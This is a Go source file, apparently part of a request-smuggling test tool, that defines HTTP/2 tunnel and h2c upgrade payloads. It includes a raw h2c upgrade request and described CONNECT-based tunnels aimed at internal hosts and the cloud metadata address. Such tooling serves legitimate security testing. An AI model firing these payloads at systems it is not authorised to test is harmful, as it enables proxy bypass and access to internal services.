package vectors

import (
	"github.com/byteoverride/desynctrace/internal/client"
)

// H2TunnelVector tests HTTP/2 tunnel smuggling (CONNECT method and Upgrade).
// Some proxies support HTTP/2 CONNECT or h2c upgrade, creating tunnels
// that can be abused to smuggle requests past access controls.
type H2TunnelVector struct{}

func NewH2TunnelVector() *H2TunnelVector {
	return &H2TunnelVector{}
}

func (v *H2TunnelVector) Name() string {
	return "H2.Tunnel (HTTP/2 Tunnel & Upgrade Smuggling)"
}

func (v *H2TunnelVector) Type() VectorType {
	return H2Tunnel
}

func (v *H2TunnelVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	return nil // requires specialized H2 handling
}

func (v *H2TunnelVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// 1. H2 CONNECT method to establish tunnel
	payloads = append(payloads, RawPayload{
		Name: "h2-connect-tunnel",
		Description: "H2 CONNECT method: :method=CONNECT, :authority=internal-host:80. " +
			"If proxy allows CONNECT, attacker gets raw TCP tunnel to internal services.",
		Technique: "h2-connect",
	})

	// 2. h2c upgrade smuggling via H1
	// Send HTTP/1.1 with Upgrade: h2c to trick proxy into upgrading,
	// then send H2 frames on the upgraded connection
	{
		raw := "GET / HTTP/1.1\r\n" +
			"Host: " + host + "\r\n" +
			"Upgrade: h2c\r\n" +
			"HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\n" +
			"Connection: Upgrade, HTTP2-Settings\r\n" +
			"\r\n"
		payloads = append(payloads, RawPayload{
			Name:        "h2c-upgrade",
			Data:        []byte(raw),
			Description: "h2c upgrade request. If proxy forwards Upgrade header to backend, attacker can send raw H2 frames that bypass proxy inspection.",
			Technique:   "h2c-upgrade",
		})
	}

	// 3. WebSocket-to-H2 confusion
	payloads = append(payloads, RawPayload{
		Name: "h2-websocket-confusion",
		Description: "H2 Extended CONNECT for WebSocket (:protocol=websocket). " +
			"Proxy may not inspect WebSocket frames, allowing smuggled HTTP requests within the tunnel.",
		Technique: "h2-websocket-tunnel",
	})

	// 4. H2 CONNECT to localhost (SSRF via tunnel)
	payloads = append(payloads, RawPayload{
		Name: "h2-connect-localhost",
		Description: "H2 CONNECT to 127.0.0.1:80. If proxy allows, creates tunnel to localhost/internal network. " +
			"Can access metadata endpoints (169.254.169.254), internal APIs, etc.",
		Technique: "h2-connect-ssrf",
	})

	return payloads
}

func (v *H2TunnelVector) Verify(resp *client.Response) bool {
	return resp.StatusCode == 200 || resp.StatusCode == 101
}
